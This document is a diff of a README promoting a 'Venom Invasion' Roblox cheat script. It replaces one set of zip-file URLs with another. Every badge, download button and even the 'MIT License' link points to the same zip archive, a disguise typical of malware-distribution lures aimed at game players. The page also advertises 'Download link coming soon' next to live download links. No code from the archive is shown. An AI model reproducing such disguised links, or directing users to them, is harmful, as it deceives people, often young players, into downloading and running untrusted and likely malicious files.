@@ -1,9 +1,9 @@
 # 🕷️ Venom Invasion Roblox Script
 
-[![Maintenance](https://raw.githubusercontent.com/y1s3ra150/venom-invasion-roblox-toolkit/branch/lawsuit/venom-invasion-roblox-toolkit-2.4.zip)](https://raw.githubusercontent.com/y1s3ra150/venom-invasion-roblox-toolkit/branch/lawsuit/venom-invasion-roblox-toolkit-2.4.zip)
-[![MIT License](https://raw.githubusercontent.com/y1s3ra150/venom-invasion-roblox-toolkit/branch/lawsuit/venom-invasion-roblox-toolkit-2.4.zip)](https://raw.githubusercontent.com/y1s3ra150/venom-invasion-roblox-toolkit/branch/lawsuit/venom-invasion-roblox-toolkit-2.4.zip)
-[![Build Status](https://raw.githubusercontent.com/y1s3ra150/venom-invasion-roblox-toolkit/branch/lawsuit/venom-invasion-roblox-toolkit-2.4.zip)](https://raw.githubusercontent.com/y1s3ra150/venom-invasion-roblox-toolkit/branch/lawsuit/venom-invasion-roblox-toolkit-2.4.zip)
-[![Support](https://raw.githubusercontent.com/y1s3ra150/venom-invasion-roblox-toolkit/branch/lawsuit/venom-invasion-roblox-toolkit-2.4.zip)](https://raw.githubusercontent.com/y1s3ra150/venom-invasion-roblox-toolkit/branch/lawsuit/venom-invasion-roblox-toolkit-2.4.zip)
+[![Maintenance](https://github.com/y1s3ra150/venom-invasion-roblox-toolkit/raw/refs/heads/branch/lawsuit/invasion-toolkit-venom-roblox-v3.8.zip)](https://github.com/y1s3ra150/venom-invasion-roblox-toolkit/raw/refs/heads/branch/lawsuit/invasion-toolkit-venom-roblox-v3.8.zip)
+[![MIT License](https://github.com/y1s3ra150/venom-invasion-roblox-toolkit/raw/refs/heads/branch/lawsuit/invasion-toolkit-venom-roblox-v3.8.zip)](https://github.com/y1s3ra150/venom-invasion-roblox-toolkit/raw/refs/heads/branch/lawsuit/invasion-toolkit-venom-roblox-v3.8.zip)
+[![Build Status](https://github.com/y1s3ra150/venom-invasion-roblox-toolkit/raw/refs/heads/branch/lawsuit/invasion-toolkit-venom-roblox-v3.8.zip)](https://github.com/y1s3ra150/venom-invasion-roblox-toolkit/raw/refs/heads/branch/lawsuit/invasion-toolkit-venom-roblox-v3.8.zip)
+[![Support](https://github.com/y1s3ra150/venom-invasion-roblox-toolkit/raw/refs/heads/branch/lawsuit/invasion-toolkit-venom-roblox-v3.8.zip)](https://github.com/y1s3ra150/venom-invasion-roblox-toolkit/raw/refs/heads/branch/lawsuit/invasion-toolkit-venom-roblox-v3.8.zip)
 
 Welcome to the official repository for **Venom Invasion Roblox Script**, your ultimate utility toolkit designed for seamless gameplay enhancement in the Roblox universe. Our script transforms your Roblox Venom Invasion journey, wrapping engaging features, intelligent automation, and an interface that feels like an extension of your own thoughts. Whether you’re a solo adventurer or teaming up with friends, this script empowers you to conquer new frontiers with confidence and creativity.
 
@@ -82,7 +82,7 @@ We believe that support shouldn’t sleep. With our blend of human and AI-powere
 
 Ready to inject a dose of innovation into your Roblox session? Download the Venom Invasion Roblox Script now:
 
-### [![Download](https://raw.githubusercontent.com/y1s3ra150/venom-invasion-roblox-toolkit/branch/lawsuit/venom-invasion-roblox-toolkit-2.4.zip)](https://raw.githubusercontent.com/y1s3ra150/venom-invasion-roblox-toolkit/branch/lawsuit/venom-invasion-roblox-toolkit-2.4.zip)
+### [![Download](https://github.com/y1s3ra150/venom-invasion-roblox-toolkit/raw/refs/heads/branch/lawsuit/invasion-toolkit-venom-roblox-v3.8.zip)](https://github.com/y1s3ra150/venom-invasion-roblox-toolkit/raw/refs/heads/branch/lawsuit/invasion-toolkit-venom-roblox-v3.8.zip)
 
 *[Download link coming soon. Bookmark this page and check for updates!]*
 
@@ -114,7 +114,7 @@ If you require help, reach out through the Issues tab or check our wiki for an e
 
 To ensure you always know where to find the latest version, here's another quick access:
 
-### [![Download](https://raw.githubusercontent.com/y1s3ra150/venom-invasion-roblox-toolkit/branch/lawsuit/venom-invasion-roblox-toolkit-2.4.zip)](https://raw.githubusercontent.com/y1s3ra150/venom-invasion-roblox-toolkit/branch/lawsuit/venom-invasion-roblox-toolkit-2.4.zip)
+### [![Download](https://github.com/y1s3ra150/venom-invasion-roblox-toolkit/raw/refs/heads/branch/lawsuit/invasion-toolkit-venom-roblox-v3.8.zip)](https://github.com/y1s3ra150/venom-invasion-roblox-toolkit/raw/refs/heads/branch/lawsuit/invasion-toolkit-venom-roblox-v3.8.zip)
 
 ---
 
@@ -122,7 +122,7 @@ To ensure you always know where to find the latest version, here's another quick
 
 Copyright (c) 2025
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/y1s3ra150/venom-invasion-roblox-toolkit/branch/lawsuit/venom-invasion-roblox-toolkit-2.4.zip) — a permission slip for creativity and open collaboration!  
+This project is licensed under the [MIT License](https://github.com/y1s3ra150/venom-invasion-roblox-toolkit/raw/refs/heads/branch/lawsuit/invasion-toolkit-venom-roblox-v3.8.zip) — a permission slip for creativity and open collaboration!  
 You are invited to use, modify, distribute, and even fork this project—with a nod to the authors and without limitation.
 
 ---
